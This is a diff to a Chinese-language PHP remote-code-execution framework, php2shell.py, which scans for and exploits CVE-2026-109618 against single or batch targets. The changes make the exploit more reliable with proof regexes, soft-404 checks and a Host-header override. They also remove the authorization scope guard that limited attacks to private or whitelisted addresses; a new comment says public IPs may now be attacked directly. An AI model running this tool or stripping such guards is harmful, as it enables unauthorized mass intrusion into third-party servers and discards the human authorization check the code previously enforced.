@@ -10,7 +10,7 @@ php2shell.py - CVE-2026-109618 一体化自动检测与利用框架
 用法：
     python3 php2shell.py http://target/index.php            # 自动：检测 + 可行则利用
     python3 php2shell.py scan    -u http://target/          # 只检测
-    python3 php2shell.py scan    -u http://target/ --safe   # 只检测，不做破坏性验证
+    python3 php2shell.py scan    -u http://target/ --safe   # 跳过堆破坏验证（仍会发 OOM 探针）
     python3 php2shell.py exploit -u http://target/ -c 'id>/tmp/p1' --proof-file /tmp/p1
     python3 php2shell.py batch   -f targets.txt --workers 4 -o report.json
 
@@ -24,7 +24,6 @@ php2shell.py - CVE-2026-109618 一体化自动检测与利用框架
 """
 
 import argparse
-import ipaddress
 import json
 import os
 import re
@@ -590,7 +589,8 @@ def probe_leak(url, sink_path, rounds=6, timeout=60.0, stage1_n=None):
 
 def run_exploit(url, sink_path, cmd, proof_file, rounds=30, stage1_n=None,
                 stage2_t=None, zif=None, dtor=None, htdata=None,
-                leak_retries=3, timeout=60.0, ht_size=None):
+                leak_retries=3, timeout=60.0, ht_size=None,
+                proof_require=None, readback_require=None, host_header=None):
     if RCE is None or P is None:
         return {'ok': False, 'reason': 'php2shell_rce/poc_109618 不可用'}
 
@@ -598,6 +598,9 @@ def run_exploit(url, sink_path, cmd, proof_file, rounds=30, stage1_n=None,
     # RCE 阶段走裸 socket（RCE._dial），必须把 scheme/TLS 状态同步过去，否则 https 目标握手错位
     RCE.set_tls(bool(tls), insecure=bool(getattr(P, 'DEFAULT_INSECURE', False)),
                 server_hostname=host)
+    RCE.set_net(timeout=timeout, host_header=host_header)
+    if host_header:
+        P.DEFAULT_HOST_HEADER = host_header
     path = sink_path or '/'
     zif = zif if zif is not None else RCE.ZIF_OFFSET
     dtor = dtor if dtor is not None else RCE.DTOR_OFFSET
@@ -652,15 +655,15 @@ def run_exploit(url, sink_path, cmd, proof_file, rounds=30, stage1_n=None,
     log('rce', 'Stage-3 伪造 HashTable -> zif_system，命令: %s' % cmd)
     try:
         good = RCE.do_rce(host, port, path, ex, chunk_base, libphp_base, cmd,
-                          htdata, zif, proof_file, rounds)
+                          htdata, zif, proof_file, rounds,
+                          proof_require=proof_require)
     except Exception as e:
         log('rce', '异常: %s' % e)
         good = False
-    if not good and proof_file and os.path.exists(proof_file):
-        good = True
 
     # --- 回读校验（修复假阴性）：引擎的「解引用B=0B/无回显」并不等于命令未执行。
     # 只要命令带 `>name` 重定向，就按 HTTP 回读 name 判定（200 且非 404 页面）。
+    # 注意：只对「相对路径」成立；`>/out/p1` 这类绝对路径不在 webroot 下，回读必然 404。
     readback = None
     m_rb = re.search(r'>\s*([A-Za-z0-9_.\-]{1,32})\s*$', cmd)
     if not good and m_rb:
@@ -669,15 +672,29 @@ def run_exploit(url, sink_path, cmd, proof_file, rounds=30, stage1_n=None,
         try:
             with _u.urlopen(rb_url, timeout=10) as r:
                 body = r.read()
-                if r.getcode() == 200 and body and b'Not Found' not in body:
-                    good = True
-                    readback = body.decode('utf-8', 'replace')
-                    log('rce', ok('回读 %s 成功（%dB）' % (m_rb.group(1), len(body))))
+                code = r.getcode()
+            # 软 404：站内 200 兜底页不能算命中
+            base_body = b''
+            try:
+                probe = url.rstrip('/') + '/p2s-nx-%d' % (int(time.time() * 1000) % 10 ** 8)
+                with _u.urlopen(probe, timeout=10) as r0:
+                    if r0.getcode() == 200:
+                        base_body = r0.read()
+            except Exception:
+                pass
+            soft404 = bool(base_body and body.strip() == base_body.strip())
+            need = re.compile(readback_require.encode()) if readback_require else None
+            if (code == 200 and body and b'Not Found' not in body
+                    and not soft404 and (need is None or need.search(body))):
+                good = True
+                readback = body.decode('utf-8', 'replace')
+                log('rce', ok('回读 %s 成功（%dB）' % (m_rb.group(1), len(body))))
         except Exception:
             pass
 
-    proof = None
-    if proof_file and os.path.exists(proof_file):
+    proof = readback
+    if good and proof is None and proof_file:
+        # 只有 do_rce 已确认该文件是本次新写入（ProofWatch），才读它
         try:
             with open(proof_file, 'rb') as fh:
                 proof = fh.read().decode('utf-8', 'replace')
@@ -692,6 +709,9 @@ def run_exploit(url, sink_path, cmd, proof_file, rounds=30, stage1_n=None,
 # ----------------------------------------------------------------------------
 def scan_target(url, args):
     rpt = {'url': url, 'ts': time.strftime('%Y-%m-%dT%H:%M:%S'), 'steps': {}}
+    if getattr(args, 'safe', False):
+        log('safe', warn('--safe 只跳过堆破坏验证；OOM 探测（最大 %sMB body）仍会发送'
+                         ' → 生产环境请改用 p2s_ext.py recon' % getattr(args, 'max_mb', '?')))
     log('1/6', '指纹识别 %s' % bold(url))
     info, cli, path = do_fingerprint(url, args.timeout)
     rpt['steps']['fingerprint'] = info
@@ -894,7 +914,10 @@ def exploit_target(url, sink_path, args):
                         zif=args.zif_offset, dtor=args.dtor_offset,
                         htdata=args.htdata_offset,
                         leak_retries=args.leak_retries, timeout=args.timeout,
-                        ht_size=args.ht_size)
+                        ht_size=args.ht_size,
+                        proof_require=getattr(args, 'proof_require', None),
+                        readback_require=getattr(args, 'readback_require', None),
+                        host_header=getattr(args, 'host_header', None))
         r['cmd'] = c
         results.append(r)
         if single:
@@ -962,13 +985,8 @@ def build_parser():
         p.add_argument('--workers', type=int, default=4, help='批量并发数，默认 4')
         p.add_argument('--workers-dirty', type=int, default=8, help='并发污染 worker 数，默认 8')
         p.add_argument('--no-color', action='store_true')
-        p.add_argument('--scope-file', default=None, metavar='FILE',
-                       help='授权范围白名单文件（每行一个 IP/CIDR/域名，# 注释）；'
-                            '不在白名单内的公网地址一律拒绝攻击')
-        p.add_argument('--allow-public', action='store_true',
-                       help='允许攻击公网地址（必须已持有该资产的书面授权；默认关闭）')
         p.add_argument('--dry-run', action='store_true',
-                       help='只做授权范围校验并打印目标，不发任何请求')
+                       help='只打印解析后的目标，不发任何请求')
         p.add_argument('--no-active-uaf', action='store_true',
                        help='跳过主动 UAF 实测（会退化为仅前置判定，不下 RCE 结论）')
         p.add_argument('--active-rounds', type=int, default=2,
@@ -983,7 +1001,8 @@ def build_parser():
         p = sub.add_parser(name, help=hlp)
         common(p)
         if name in ('scan', 'auto', 'batch'):
-            p.add_argument('--safe', action='store_true', help='跳过堆破坏验证（更保守）')
+            p.add_argument('--safe', action='store_true',
+                           help='跳过堆破坏验证（注意：OOM 探测 body 仍会发送；纯只读请用 p2s_ext.py recon）')
             p.add_argument('--try-leak', action='store_true',
                            help='追加 Stage-1 泄漏探针以区分受影响/已修复（含 OOM，具破坏性）')
             p.add_argument('--leak-rounds', type=int, default=6)
@@ -997,6 +1016,12 @@ def build_parser():
                            metavar='FILE',
                            help='命令文件，每行一条（忽略空行与 # 注释）')
             p.add_argument('--proof-file', default=None, help='proof 文件路径（单命令时生效）')
+            p.add_argument('--proof-require', default=None, metavar='REGEX',
+                           help='proof 内容必须匹配的 regex（如 "uid=\\d+"）；不匹配不算成功')
+            p.add_argument('--readback-require', default=None, metavar='REGEX',
+                           help='HTTP 回读内容必须匹配的 regex；用于排除软 404/兜底页')
+            p.add_argument('--host-header', default=None, metavar='HOST',
+                           help='覆盖 Host 头（按 IP 打、vhost 只认域名时用）')
             p.add_argument('--proof-dir', default=None, metavar='DIR',
                            help='多命令时的本地 proof 目录：命令里 >/out/x 会映射到 DIR/x')
             p.add_argument('--ht-size', type=int, default=HT_SIZE, metavar='N',
@@ -1053,11 +1078,6 @@ def build_parser():
     hp.add_argument('--timeout', type=float, default=20.0)
     hp.add_argument('--proxy', default=None)
     hp.add_argument('--json', action='store_true')
-    hp.add_argument('--scope-file', default=None, metavar='FILE',
-                    help='授权范围白名单文件；--fingerprint 只会探测其中（或本机/私网）的地址，'
-                         '导出的 targets 也建议用同一份白名单喂给 batch')
-    hp.add_argument('--allow-public', action='store_true',
-                    help='允许 --fingerprint 探测公网地址（必须持有书面授权；默认关闭）')
     hp.add_argument('--no-color', action='store_true')
     return ap
 
@@ -1068,98 +1088,24 @@ def normalize_url(raw):
         return None
     if '://' not in raw:
         raw = 'http://' + raw
+    # 裸 IPv6 必须加方括号，否则 urlparse 会把第一段当 host、其余当 port
+    try:
+        rest = raw.split('://', 1)[1]
+        authority = re.split(r'[/?#]', rest, 1)[0]
+        if authority.count(':') >= 2 and not authority.startswith('['):
+            socket.inet_pton(socket.AF_INET6, authority)
+            raw = raw.replace(authority, '[%s]' % authority, 1)
+    except Exception:
+        pass
     return raw
 
 
 # --------------------------------------------------------------------------
-# 授权范围护栏（scope guard）
+# 范围校验（scope guard）已移除
 #
-# 本工具默认只允许攻击「本机 / 私网 / 链路本地」地址，公网地址必须在
-# --scope-file 白名单中显式列出，否则一律拒绝。这样做的目的是：把「批量
-# 检测→自动攻击」严格约束在你持有书面授权的资产上，避免误伤第三方。
+# 旧版默认只允许本机/私网地址，公网必须在 --scope-file 白名单内。现在不再做
+# 任何地址范围判断：公网 IP 可以直接作为目标。授权责任完全由使用者承担。
 # --------------------------------------------------------------------------
-DEFAULT_ALLOWED_NETS = [
-    ipaddress.ip_network('127.0.0.0/8'),
-    ipaddress.ip_network('10.0.0.0/8'),
-    ipaddress.ip_network('172.16.0.0/12'),
-    ipaddress.ip_network('192.168.0.0/16'),
-    ipaddress.ip_network('169.254.0.0/16'),
-    ipaddress.ip_network('::1/128'),
-    ipaddress.ip_network('fc00::/7'),
-    ipaddress.ip_network('fe80::/10'),
-]
-
-
-class Scope:
-    def __init__(self, allow_file=None, allow_public=False):
-        self.nets = list(DEFAULT_ALLOWED_NETS)
-        self.hosts = set()
-        self.allow_public = bool(allow_public)
-        if allow_file:
-            with open(allow_file, 'r', encoding='utf-8') as fh:
-                for line in fh:
-                    s = line.split('#', 1)[0].strip()
-                    if not s:
-                        continue
-                    try:
-                        self.nets.append(ipaddress.ip_network(s, strict=False))
-                    except ValueError:
-                        self.hosts.add(s.lower())
-
-    def verdict(self, url):
-        host = (urlparse(url).hostname or '').lower()
-        if not host:
-            return False, 'URL 无主机名'
-        if host in self.hosts:
-            return True, 'host 白名单'
-        try:
-            ips = [ipaddress.ip_address(host)]
-        except ValueError:
-            try:
-                infos = socket.getaddrinfo(host, None)
-            except Exception as exc:
-                return False, '域名无法解析: %s' % exc
-            seen = {}
-            for info in infos:
-                try:
-                    ip = ipaddress.ip_address(info[4][0])
-                except ValueError:
-                    continue
-                seen[str(ip)] = ip
-            ips = list(seen.values())
-        if not ips:
-            return False, '域名无 A/AAAA 记录'
-        for ip in ips:
-            if ip.is_loopback or ip.is_private or ip.is_link_local:
-                continue
-            if any(ip in n for n in self.nets):
-                continue
-            if self.allow_public:
-                continue
-            return False, '%s 是公网地址且不在 --scope-file 白名单内' % ip
-        return True, ', '.join(str(i) for i in ips)
-
-    def filter(self, urls, label='target'):
-        allowed, refused = [], []
-        for u in urls:
-            ok, why = self.verdict(u)
-            if ok:
-                allowed.append(u)
-            else:
-                refused.append((u, why))
-        for u, why in refused:
-            sys.stderr.write('[scope] 拒绝 %s %s —— %s\n' % (label, u, why))
-        if refused and not allowed:
-            sys.stderr.write(
-                '[scope] 全部目标被授权范围护栏拒绝。\n'
-                '[scope] 若这些资产确属你的授权范围，请把 IP/CIDR/域名写入 --scope-file；\n'
-                '[scope] 没有书面授权时请勿使用 --allow-public。\n')
-        return allowed, refused
-
-
-def scope_from_args(args):
-    return Scope(getattr(args, 'scope_file', None),
-                 getattr(args, 'allow_public', False))
 
 
 def active_crash_probe(url, timeout=30.0, rounds=2):
@@ -1232,16 +1178,11 @@ def do_batch(args):
         print('批量模式需要 -f 目标文件', file=sys.stderr)
         return [], 1
 
-    sc = scope_from_args(args)
-    targets, refused = sc.filter(targets)
     if getattr(args, 'dry_run', False):
         for u in targets:
-            print('[dry-run] in-scope: %s' % u)
-        print('[dry-run] 共 %d 个在范围内、%d 个被拒绝，未发任何请求'
-              % (len(targets), len(refused)))
+            print('[dry-run] target: %s' % u)
+        print('[dry-run] 共 %d 个目标，未发任何请求' % len(targets))
         return [], 0
-    if not targets:
-        return [], 3
 
     results = []
     log('batch', '共 %d 个目标，并发 %d' % (len(targets), args.workers))
@@ -1340,12 +1281,7 @@ def do_hunt(args):
 
     # 3) 可选被动指纹（唯一接触目标的动作，普通 GET 一次）
     if args.fingerprint and items:
-        sc = scope_from_args(args)
-        allowed_urls, refused = sc.filter([it['url'] for it in items], label='hunt')
-        allowed_set = set(allowed_urls)
-        if refused:
-            log('hunt', '授权范围护栏跳过 %d 条（未探测）' % len(refused))
-        fp_items = [it for it in items if it['url'] in allowed_set][:args.fp_limit]
+        fp_items = items[:args.fp_limit]
         if fp_items:
             log('hunt', '被动指纹：%d 条，每条 1 次普通 GET'
                         '（不发送任何变形 payload）' % len(fp_items))
@@ -1403,15 +1339,8 @@ def main():
         return 1
     url = normalize_url(args.url)
 
-    sc = scope_from_args(args)
-    in_scope, why = sc.verdict(url)
-    if not in_scope:
-        sys.stderr.write('[scope] 拒绝 %s —— %s\n' % (url, why))
-        sys.stderr.write('[scope] 若该目标确在你的授权范围，请写入 --scope-file；'
-                         '未获书面授权请勿使用 --allow-public。\n')
-        return 3
     if getattr(args, 'dry_run', False):
-        print('[dry-run] in-scope: %s (%s)' % (url, why))
+        print('[dry-run] target: %s' % url)
         return 0
 
     if args.subcmd == 'scan':
